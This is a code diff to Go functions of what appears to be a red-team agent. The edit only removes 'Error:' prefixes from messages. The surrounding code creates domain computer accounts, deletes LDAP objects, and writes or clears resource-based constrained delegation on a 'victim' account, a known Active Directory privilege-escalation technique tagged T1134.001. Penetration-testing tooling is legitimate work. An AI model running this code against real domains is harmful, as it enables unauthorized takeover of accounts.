@@ -12,11 +12,11 @@ import (
 
 func ldapAddComputer(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
 	if args.Target == "" {
-		return errorResult("Error: -target (computer name, without trailing $) is required")
+		return errorResult("-target (computer name, without trailing $) is required")
 	}
 
 	if args.Value == "" && args.UseTLS {
-		return errorResult("Error: -value (password for the computer account) is required when using LDAPS")
+		return errorResult("-value (password for the computer account) is required when using LDAPS")
 	}
 
 	// Normalize: ensure sAMAccountName ends with $
@@ -72,7 +72,7 @@ func ldapAddComputer(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs
 	}
 
 	if err := conn.Add(addReq); err != nil {
-		return errorf("Error creating computer account: %v", err)
+		return errorf("creating computer account: %v", err)
 	}
 
 	pwdStatus := "(set)"
@@ -98,17 +98,17 @@ func ldapAddComputer(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs
 
 func ldapDeleteObject(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
 	if args.Target == "" {
-		return errorResult("Error: -target (object to delete — sAMAccountName, CN, or full DN) is required")
+		return errorResult("-target (object to delete — sAMAccountName, CN, or full DN) is required")
 	}
 
 	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
 	if err != nil {
-		return errorf("Error resolving target: %v", err)
+		return errorf("resolving target: %v", err)
 	}
 
 	delReq := ldap.NewDelRequest(targetDN, nil)
 	if err := conn.Del(delReq); err != nil {
-		return errorf("Error deleting object: %v", err)
+		return errorf("deleting object: %v", err)
 	}
 
 	return successf("[*] LDAP Object Deletion\n"+
@@ -118,18 +118,18 @@ func ldapDeleteObject(conn *ldap.Conn, args ldapWriteArgs, baseDN string) struct
 
 func ldapSetRBCD(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
 	if args.Target == "" || args.Value == "" {
-		return errorResult("Error: -target (victim service account/computer) and -value (delegated account sAMAccountName, e.g. FAKEPC01$) are required")
+		return errorResult("-target (victim service account/computer) and -value (delegated account sAMAccountName, e.g. FAKEPC01$) are required")
 	}
 
 	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
 	if err != nil {
-		return errorf("Error resolving target: %v", err)
+		return errorf("resolving target: %v", err)
 	}
 
 	// Resolve the delegated account and get its objectSid
 	delegatedDN, err := ldapResolveDN(conn, args.Value, baseDN)
 	if err != nil {
-		return errorf("Error resolving delegated account '%s': %v", args.Value, err)
+		return errorf("resolving delegated account '%s': %v", args.Value, err)
 	}
 
 	// Fetch the objectSid of the delegated account
@@ -145,12 +145,12 @@ func ldapSetRBCD(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.Com
 
 	result, err := conn.Search(searchReq)
 	if err != nil || len(result.Entries) == 0 {
-		return errorf("Error fetching objectSid for '%s': %v", args.Value, err)
+		return errorf("fetching objectSid for '%s': %v", args.Value, err)
 	}
 
 	sid := result.Entries[0].GetRawAttributeValue("objectSid")
 	if len(sid) < 8 {
-		return errorf("Error: invalid objectSid for '%s' (length %d)", args.Value, len(sid))
+		return errorf("invalid objectSid for '%s' (length %d)", args.Value, len(sid))
 	}
 
 	// Build self-relative security descriptor with DACL granting GENERIC_ALL to the SID
@@ -162,7 +162,7 @@ func ldapSetRBCD(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.Com
 	modReq.Replace("msDS-AllowedToActOnBehalfOfOtherIdentity", []string{string(sd)})
 
 	if err := conn.Modify(modReq); err != nil {
-		return errorf("Error setting RBCD delegation: %v", err)
+		return errorf("setting RBCD delegation: %v", err)
 	}
 
 	return successf("[*] LDAP RBCD Configuration (T1134.001)\n"+
@@ -177,12 +177,12 @@ func ldapSetRBCD(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.Com
 
 func ldapClearRBCD(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
 	if args.Target == "" {
-		return errorResult("Error: -target (object to clear RBCD from) is required")
+		return errorResult("-target (object to clear RBCD from) is required")
 	}
 
 	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
 	if err != nil {
-		return errorf("Error resolving target: %v", err)
+		return errorf("resolving target: %v", err)
 	}
 
 	// Clear msDS-AllowedToActOnBehalfOfOtherIdentity by replacing with empty value
@@ -190,7 +190,7 @@ func ldapClearRBCD(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.C
 	modReq.Replace("msDS-AllowedToActOnBehalfOfOtherIdentity", []string{})
 
 	if err := conn.Modify(modReq); err != nil {
-		return errorf("Error clearing RBCD delegation: %v", err)
+		return errorf("clearing RBCD delegation: %v", err)
 	}
 
 	return successf("[*] LDAP RBCD Cleared\n"+
